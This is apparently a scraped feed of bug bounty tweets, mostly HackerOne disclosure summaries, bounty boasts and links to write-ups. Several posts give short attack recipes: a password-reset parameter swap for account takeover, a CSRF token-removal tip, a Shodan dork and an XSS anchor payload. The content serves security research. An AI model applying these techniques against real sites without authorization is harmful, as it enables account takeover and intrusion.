+🎉 We're just 69 followers away from reaching the incredible 5K milestone for @h1Disclosed! 🙌
+
+If you are already following @h1disclosed then don't forget to like and repost to spread the word with your fellow bug bounty hunters !!
+
+#bugbounty #bugbountytips #cybersecurity
+
+[129] ids=1700051465530655186
+1- create 2 accounts (A , B )
+2- reset password for account A 
+3- follow the regular flow and study the link sent to your email 
+I noticed that it had mail param https://hatab.com/login/change/?hash=blabla&mail=A%40gmail.com…
+4- change the mail value to account B 
+happy hunting 
+#BugBounty #bugbountytips
+
+[130] ids=1700056520988467337
+======================
+⚡ http://yelp.com and http://biz.yelp.com ATO via XSS + Cookie Bridge 
+👨🏻‍💻 @lil_endian ➟ Yelp 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2089042
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[131] ids=1700071638220632254
+======================
+⚡ Support Tickets can be created on behalf of other users using spoofed email | Bypass of #2001913 
+👨🏻‍💻 as_patro ➟ HackerOne 
+⬜ None
+💰 $1,000
+🔗 https://hackerone.com/reports/2109382
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[132] ids=1700073541935538236
+Sticking to a program....... Worth it #BugBounty #bugbountytips
+Thanks @InsiderPhD
+
+[133] ids=1700086759504347404
+======================
+⚡ Unauthorized Ticket can be created by an Attacker in user's Helpdesk account 
+👨🏻‍💻 fanimalikhack ➟ HackerOne 
+⬜ None
+💰 $1,000
+🔗 https://hackerone.com/reports/2079502
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[134] ids=1700106544682058239
+How I got RXSS from Shodan😎
+
+https://melguerdawi.medium.com/how-i-get-rxss-from-shodan-31d63be9b31…
+
+#bugbountytips #BugBounty #hackerone #shodan #recon
+
+[135] ids=1700147117245829526
+======================
+⚡ CVE-2023-40195: Apache Airflow Spark Provider Deserialization Vulnerability RCE 
+👨🏻‍💻 @happyhacking123 ➟ Internet Bug Bounty 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2127968
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[136] ids=1700163039775903980
+الحمد لله
+Happy to secure another company
+ CSRF
+Steps to reproduce and tip:
+
+1- change your profile data and intercept the post request
+2- (tip) delete the verification token then generate the csrf poc 
+3- send it to victum => 200 ok => victum's profile updated
+
+#bugbountytips
+
+[137] ids=1700172043734385112
+Yay, I was awarded a $3,000 bounty on @Hacker0x01!
+
+Tip: try [TAB] at the T.E header 🤙
+
+ https://hackerone.com/kassem_s94 #TogetherWeHitHarder
+#bugbountytips
+#BugBounty 
+#hackers
+#hacking
+
+[138] ids=1700207507158045164
+======================
+⚡ CVE-2023-24488 xss on https://██████/ 
+👨🏻‍💻 @0xmaruf ➟ U.S. Dept Of Defense 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/2045549
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[139] ids=1700207900122296346
+======================
+⚡ Blind Sql Injection in https://█████/qsSearch.aspx 
+👨🏻‍💻 hackdog0ne ➟ U.S. Dept Of Defense 
+🟥 High
+💰 None
+🔗 https://hackerone.com/reports/2081316
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[140] ids=1700208158122414536
+======================
+⚡ LDAP Anonymous Login enabled in ████ 
+👨🏻‍💻 @WHOISshuvam ➟ U.S. Dept Of Defense 
+🟥 High
+💰 None
+🔗 https://hackerone.com/reports/2081332
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[141] ids=1700208414113280369
+======================
+⚡ Adobe ColdFusion - Access Control Bypass [CVE-2023-38205] at ██████ 
+👨🏻‍💻 mega7 ➟ U.S. Dept Of Defense 
+🟥 High
+💰 None
+🔗 https://hackerone.com/reports/2082528
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[142] ids=1700306097733586971
+After 20 days, I did it 
+#bugbountytips
+
+[143] ids=1700309636430037491
+I swear am the king 
+Hi , I am the #1 on a private program on
+@Hacker0x01 ❤️👾
+7 reports in the way to be triaged 😶‍🌫️
+#bugbountytips #BugBounty #hackerone #bugbounty #hacking #cybersecurity
+
+[144] ids=1700359079569265066
+BurpSuite 101 
+https://medium.com/@omccarth333/burpsuite-101-87881162ffaf?source=rss------bug_bounty-5… 
+
+#cyberattack #bugbountytips #hackerone #bugcrowd #intigiti #infosec #cybersecurity #pentesting #redteam #informationsecurity #cybersecurity #bugbounty
+
+[145] ids=1700418898552885509
+======================
+⚡ Permissions not respected when copying entire group folders 
+👨🏻‍💻 carl_schwan ➟ Nextcloud 
+🟧 Medium
+💰 None
+🔗 https://hackerone.com/reports/1808079
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[146] ids=1700435517668823404
+Happy to Secure @Sony Again 
+
+Bug - SQL Injection
+
+#bugbountytips #bugbounty #swags #hackerone #sony #bugcrowd
+
+[147] ids=1700438555443736707
+Happy to Secure one more Domain
+
+Reward - Small Bounty and Swag 
+
+Bug - XSS 
+
+#bugbountytips #bugbounty #hackerone #bugcrowd #swag
+
+[148] ids=1700477926280450426
+Tips :
+use shodan dork 
+
+1 - http://ssl.cert.subject.cn:"site" 200
+2 - fuzz 403 and 404 pages 
+
+#bugbounty #bugbountytips
+
+[149] ids=1700509546945585452
+======================
+⚡ Argocd's web terminal session doesn't expire 
+👨🏻‍💻 bean-zhang ➟ Internet Bug Bounty 
+🟧 Medium
+💰 $2,540
+🔗 https://hackerone.com/reports/2123094
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[150] ids=1700539700312961499
+======================
+⚡ Dependency Policy Bypass via process.binding 
+👨🏻‍💻 @LeoDog896 ➟ Internet Bug Bounty 
+🟧 Medium
+💰 $635
+🔗 https://hackerone.com/reports/2120719
+======================
+#bugbounty #bugbountytips #cybersecurity #infosec
+
+[151] ids=1700570476618055770
+How I Find API disclosure $$$ 
+https://medium.com/@abinjohn1238901/how-i-find-api-disclosure-6a1247c28f24?source=rss------bug_bounty-5… 
+
+#cyberattack #bugbountytips #hackerone #bugcrowd #intigiti #infosec #cybersecurity #pentesting #redteam #informationsecurity #cybersecurity #bugbounty
+
+[152] ids=1700590035282587861
+Hi guys, Recently one of my bugs got triaged and I got a 3-digit bounty. About a month ago, I published the write-up on Medium about Mass Hunting XSS Swaggers. So follow the threads for some tips:
+
+#bugbountytips
+#bugbountytip
+#bugbounty
+
+[153] ids=1700590393388363907
+Account Takeover Through Host Header Injection
+Example:⚔️
+
+#infosec #cybersec #bugbountytips
+
+[154] ids=1700602316850676028
+I completed 712 reputation with more than 5000$ arwads
+@Hacker0x01 
+#bugbountytips 
+#hackerone
+
+[155] ids=1700617019677200509
+Account Takeover Through Host Header Injection Example:⚔️ 
+
+Credit: @0x0SojalSec 
+
+#infosec #cybersec #bugbountytips
+
+[156] ids=1700713126482633167
+XSS Day #27
+
+All payloads without user interaction seemed to be filtered. Using the javascript URI, we can hide a payload within an anchor tag using href.
+
+Payload - <a href=javascript:alert()>Click</a>
+
+#cybersecuritytips #XSS #bugbountytips #Pentesting #BugBounty
+
+[157] ids=1700721707768512864
+when you got 404 page try to fuzz for some paths you may got XSS , information disclosure or something 
+#bugbountytips #BugBounty #hackerone #bugbounty #hacking #cybersecurity
+
+[158] ids=1700732947429756990
+@seasides_conf @bugbountyvillag ja rahe hain...
+
+SQLMap author @stamparm se training lene...😌
+
+20-22 k beech MidSem Exam Schedule mt krna ... bss baat khatam 🙂
+
+Aap v register krlo : https://forms.gle/3uNzXUar7KwKPHoq7…
+
+#cybersecurity #seasides #bugbountytips #BugBounty
+
+[159] ids=1700741402471088316
+#BugBounty #bugbountytips #cybersecuritytips
+
+[160] ids=1700765068672324014
+"Become a Bug Bounty Pro: Check Out These Top 10 Tools"
+"Don't settle for mediocre bug bounty results! Try out these top 10 tools to become a top earner and expert bug hunter. 🏆💻💰 #BugBountyTips #CyberSecuritySkills #HackerCommunity"
+
+Video Link:
